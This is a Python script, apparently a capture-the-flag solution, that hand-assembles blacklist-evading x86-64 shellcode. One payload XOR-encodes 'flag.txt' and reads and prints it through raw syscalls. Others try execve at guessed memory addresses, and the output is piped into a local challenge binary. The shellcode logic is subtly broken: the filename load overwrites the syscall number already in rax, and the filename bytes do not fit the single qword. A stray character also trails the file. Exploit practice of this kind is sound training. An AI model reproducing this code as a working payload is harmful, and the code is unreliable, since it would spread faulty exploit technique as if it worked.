#!/usr/bin/env python3

def create_flag_reader():
    """
    Read flag.txt directly using open/read/write syscalls
    This avoids all the shell-spawning complexity
    """
    blacklist = set([0x3b, 0x54, 0x62, 0x69, 0x6e, 0x73, 0x68, 0xf6, 0xd2, 0xc0, 0x5f, 0xc9, 0x66, 0x6c, 0x61, 0x67])
    
    print("=== Creating flag reader ===")
    
    # We need to build "flag.txt\x00" but 'f', 'l', 'a', 'g' are blacklisted
    # Let's encode it with XOR
    
    target = b"flag.txt\x00"
    print(f"Target filename: {[hex(b) for b in target]}")
    print(f"Blacklisted in target: {[hex(b) for b in target if b in blacklist]}")
    
    # Find working XOR key
    for key in range(1, 256):
        if key in blacklist:
            continue
            
        encoded = bytes([b ^ key for b in target])
        if any(b in blacklist for b in encoded):
            continue
            
        # Check if we can build it as qword
        qword = int.from_bytes(encoded.ljust(16, b'\x00')[:8], 'little')
        qword_bytes = qword.to_bytes(8, 'little')
        
        if any(b in blacklist for b in qword_bytes):
            continue
            
        print(f"Found working XOR key for filename: 0x{key:02x}")
        print(f"Encoded: {[hex(b) for b in encoded]}")
        
        shellcode = bytearray()
        
        # === OPEN SYSCALL ===
        # open(filename, O_RDONLY) - syscall 2
        shellcode.extend([0x6a, 0x02])         # push 2
        shellcode.extend([0x58])               # pop rax (open syscall)
        
        # Build filename on stack
        shellcode.extend([0x48, 0xb8])         # mov rax, imm64  
        shellcode.extend(qword_bytes)
        shellcode.extend([0x50])               # push rax
        
        # Point rdi to filename
        shellcode.extend([0x48, 0x89, 0xe7])   # mov rdi, rsp
        
        # Decode filename
        for i in range(len(target)):
            if i > 0:
                shellcode.extend([0x48, 0x83, 0xc7, 0x01])  # add rdi, 1
            shellcode.extend([0x80, 0x37, key])            # xor byte ptr [rdi], key
        
        # Reset rdi to start of filename
        shellcode.extend([0x48, 0x89, 0xe7])   # mov rdi, rsp
        
        # rsi = O_RDONLY (0)
        shellcode.extend([0x6a, 0x00])         # push 0
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xce])   # mov rsi, rcx
        
        # rdx = mode (not needed for O_RDONLY, but set to 0)
        shellcode.extend([0x48, 0x89, 0xca])   # mov rdx, rcx
        
        # open syscall
        shellcode.extend([0x0f, 0x05])
        
        # rax now contains file descriptor (or -1 if error)
        # Save fd in a register
        shellcode.extend([0x48, 0x89, 0xc1])   # mov rcx, rax (save fd)
        
        # === READ SYSCALL ===
        # read(fd, buffer, count) - syscall 0
        shellcode.extend([0x6a, 0x00])         # push 0
        shellcode.extend([0x58])               # pop rax (read syscall)
        
        # rdi = fd (from rcx)
        shellcode.extend([0x48, 0x89, 0xcf])   # mov rdi, rcx
        
        # Allocate space on stack for buffer (64 bytes should be enough)
        shellcode.extend([0x48, 0x83, 0xec, 0x40])  # sub rsp, 64
        
        # rsi = buffer (stack pointer)
        shellcode.extend([0x48, 0x89, 0xe6])   # mov rsi, rsp
        
        # rdx = count (64 bytes)
        shellcode.extend([0x6a, 0x40])         # push 64
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xca])   # mov rdx, rcx
        
        # read syscall
        shellcode.extend([0x0f, 0x05])
        
        # rax now contains number of bytes read
        # Save bytes read count
        shellcode.extend([0x48, 0x89, 0xc2])   # mov rdx, rax (bytes read)
        
        # === WRITE SYSCALL ===
        # write(stdout, buffer, bytes_read) - syscall 1
        shellcode.extend([0x6a, 0x01])         # push 1
        shellcode.extend([0x58])               # pop rax (write syscall)
        
        # rdi = 1 (stdout)
        shellcode.extend([0x6a, 0x01])         # push 1
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xcf])   # mov rdi, rcx
        
        # rsi = buffer (already pointing to stack)
        # rdx = bytes read (already set)
        
        # write syscall
        shellcode.extend([0x0f, 0x05])
        
        # === EXIT SYSCALL ===
        shellcode.extend([0x6a, 0x3c])         # push 60
        shellcode.extend([0x58])               # pop rax (exit syscall)
        shellcode.extend([0x6a, 0x00])         # push 0
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xcf])   # mov rdi, rcx (exit code 0)
        shellcode.extend([0x0f, 0x05])         # exit
        
        # Check for blacklisted bytes
        clean = True
        for i, b in enumerate(shellcode):
            if b in blacklist:
                print(f"Flag reader has blacklisted byte at {i}: 0x{b:02x}")
                clean = False
                break
        
        if clean:
            print("✅ Flag reader shellcode is clean!")
            return shellcode
        else:
            print("Shellcode has blacklisted bytes, trying next key...")
            continue
    
    print("❌ Could not create clean flag reader")
    return None

def create_simple_execve_test():
    """
    Create a very simple execve test that points to different addresses
    """
    blacklist = set([0x3b, 0x54, 0x62, 0x69, 0x6e, 0x73, 0x68, 0xf6, 0xd2, 0xc0, 0x5f, 0xc9, 0x66, 0x6c, 0x61, 0x67])
    
    print("\n=== Creating simple execve tests ===")
    
    # Try many different addresses where shells might exist
    test_addresses = [
        0x400000,    # Binary start
        0x401000,    # Code section
        0x402000,    # More code
        0x403000,    # Data section
        0x404000,    # More data
        0x405000,    # BSS maybe
        0x7ff000000000,  # High memory
    ]
    
    shellcodes = []
    
    for addr in test_addresses:
        addr_bytes = addr.to_bytes(8, 'little')
        
        if any(b in blacklist for b in addr_bytes):
            continue
            
        shellcode = bytearray()
        
        # execve setup
        shellcode.extend([0x6a, 0x3a])         # push 58
        shellcode.extend([0x58])               # pop rax
        shellcode.extend([0x04, 0x01])         # add al, 1 (rax = 59)
        
        # rdi = address to try
        shellcode.extend([0x48, 0xbf])         # mov rdi, imm64
        shellcode.extend(addr_bytes)
        
        # rsi = NULL, rdx = NULL
        shellcode.extend([0x6a, 0x00])         # push 0
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xce])   # mov rsi, rcx
        shellcode.extend([0x48, 0x89, 0xca])   # mov rdx, rcx
        
        # execve
        shellcode.extend([0x0f, 0x05])
        
        # exit with specific code to identify which address was tried
        shellcode.extend([0x6a, 0x3c])         # push 60
        shellcode.extend([0x58])               # pop rax
        addr_code = (addr >> 12) & 0xff       # Use part of address as exit code
        if addr_code == 0:
            addr_code = 42
        shellcode.extend([0x6a, addr_code])    # push exit_code
        shellcode.extend([0x59])               # pop rcx
        shellcode.extend([0x48, 0x89, 0xcf])   # mov rdi, rcx
        shellcode.extend([0x0f, 0x05])         # exit
        
        # Check for blacklisted bytes
        clean = True
        for b in shellcode:
            if b in blacklist:
                clean = False
                break
        
        if clean:
            print(f"✅ Clean execve test for 0x{addr:x} (exit code {addr_code})")
            shellcodes.append((shellcode, addr, addr_code))
    
    return shellcodes

# Create our shellcodes
flag_reader = create_flag_reader()
execve_tests = create_simple_execve_test()

# Save flag reader
if flag_reader:
    with open('flag_reader.bin', 'wb') as f:
        f.write(flag_reader)
    print("\nSaved flag_reader.bin")

# Save execve tests
for i, (shellcode, addr, exit_code) in enumerate(execve_tests):
    filename = f'execve_test_{i}.bin'
    with open(filename, 'wb') as f:
        f.write(shellcode)
    print(f"Saved {filename} (tries 0x{addr:x}, exits with {exit_code})")

print(f"\n🎯 Priority tests:")
print(f"1. cat flag_reader.bin | ./execute")
print(f"   ↳ Should print the flag directly!")
print(f"2. Test execve attempts:")
for i, (_, addr, exit_code) in enumerate(execve_tests):
    print(f"   cat execve_test_{i}.bin | ./execute  # tries 0x{addr:x}")

print(f"\n💡 The flag_reader should work even if execve doesn't!")d